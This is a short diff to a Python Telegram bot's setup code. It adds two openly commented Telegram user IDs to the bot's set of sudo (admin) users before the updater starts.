@@ -100,6 +100,8 @@ else:
     ALLOW_EXCL = Config.ALLOW_EXCL
 
 SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(386740977) #@Francoxd's ID
+SUDO_USERS.add(306117211) #@MatyOliva337's ID
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
